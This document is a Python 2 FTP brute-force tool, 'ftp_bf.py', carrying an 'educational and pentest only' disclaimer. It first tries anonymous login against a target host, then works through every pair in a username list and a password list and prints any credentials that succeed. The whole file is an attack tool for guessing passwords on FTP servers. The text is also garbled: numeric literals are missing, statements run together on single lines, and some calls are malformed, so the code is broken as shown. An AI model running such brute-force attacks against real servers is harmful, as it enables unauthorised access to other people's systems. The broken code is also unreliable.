#!/usr/bin/env python
#-*-coding = utf--*-
#author:@xfk
#blog:@blog.sina.com.cn/kaiyongdeng
#date:@--
import sys, os, time
from ftplib import FTP
docs = """
      [*] This was written for educational purpose and pentest only. Use it at your own risk. 
      [*] Author will be not responsible for any damage!
      [*] Toolname : ftp_bf.py
      [*] Coder :
      [*] Version : .
      [*] eample of use : python ftp_bf.py -t ftp.server.com -u usernames.txt -p passwords.txt
    """
if sys.platform == 'linux' or sys.platform == 'linux':
  clearing = 'clear'
else:
  clearing = 'cls'
os.system(clearing)
R = "\[m";
G = "\[m";
Y = "\[m"
END = "\[m"
def logo():
  print G+"\n |---------------------------------------------------------------|"
  print " | |"
  print " | blog.sina.com.cn/kaiyongdeng |"
  print " | // ftp_bf.py v.. |"
  print " | FTP Brute Forcing Tool |"
  print " | |"
  print " |---------------------------------------------------------------|\n"
  print " \n [-] %s\n" % time.strftime("%X")
  print docs+END
def help():
  print R+"[*]-t, --target ip/hostname <> Our target"
  print "[*]-u, --usernamelist usernamelist <> usernamelist path"
  print "[*]-p, --passwordlist passwordlist <> passwordlist path"
  print "[*]-h, --help help <> print this help"
  print "[*]Example : python ftp_bf -t ftp.server.com -u username.txt -p passwords.txt"+END sys.exit()
def bf_login(hostname,username,password):
  # sys.stdout.write("\r[!]Checking : %s " % (p))
  # sys.stdout.flush()
  try:
    ftp = FTP(hostname)
    ftp.login(hostname,username, password)
    ftp.retrlines('list')
    ftp.quit()
    print Y+"\n[!] wt,wt!!! We did it ! "
    print "[+] Target : ",hostname, ""
    print "[+] User : ",username, ""
    print "[+] Password : ",password, ""+END
    return
  # sys.exit()
  except Exception, e:
    pass except KeyboardInterrupt: print R+"\n[-] Exiting ...\n"+END
  sys.exit()
def anon_login(hostname):
  try:
    print G+"\n[!] Checking for anonymous login.\n"+END
    ftp = FTP(hostname) ftp.login()
    ftp.retrlines('LIST')
    print Y+"\n[!] wt,wt!!! Anonymous login successfuly !\n"+END
    ftp.quit()
  except Exception, e:
    print R+"\n[-] Anonymous login failed...\n"+END
    pass
def main():
  logo()
  try:
    for arg in sys.argv:
      if arg.lower() == '-t' or arg.lower() == '--target':
        hostname = sys.argv[int(sys.argv[:].index(arg))+]
      elif arg.lower() == '-u' or arg.lower() == '--usernamelist':
        usernamelist = sys.argv[int(sys.argv[:].index(arg))+]
      elif arg.lower() == '-p' or arg.lower() == '--passwordlist':
        passwordlist = sys.argv[int(sys.argv[:].index(arg))+]
      elif arg.lower() == '-h' or arg.lower() == '--help':
        help()
      elif len(sys.argv) <= :
        help()
  except:
    print R+"[-]Cheak your parametars input\n"+END
    help()
  print G+"[!] BruteForcing target ..."+END
  anon_login(hostname)
  # print "here is ok"
  # print hostname
  try:
    usernames = open(usernamelist, "r")
    user = usernames.readlines()
    count =
    while count < len(user):
      user[count] = user[count].strip()
      count +=
  except:
    print R+"\n[-] Cheak your usernamelist path\n"+END
    sys.exit()
  # print "here is ok ",usernamelist,passwordlist
  try:
    passwords = open(passwordlist, "r")
    pwd = passwords.readlines()
    count =
    while count < len(pwd):
      pwd[count] = pwd[count].strip()
      count +=
  except:
    print R+"\n[-] Check your passwordlist path\n"+END
    sys.exit()
  print G+"\n[+] Loaded:",len(user),"usernames"
  print "\n[+] Loaded:",len(pwd),"passwords"
  print "[+] Target:",hostname
  print "[+] Guessing...\n"+END
  for u in user: for p in pwd:
    result = bf_login(hostname,u.replace("\n",""),p.replace("\n",""))
    if result != :
      print G+"[+]Attempt uaername:%s password:%s..." % (u,p) + R+"Disenable"+END
    else:
      print G+"[+]Attempt uaername:%s password:%s..." % (u,p) + Y+"Enable"+END
    if not result :
      print R+"\n[-]There is no username ans password enabled in the list."
      print "[-]Exiting...\n"+END
if __name__ == "__main__":
  main()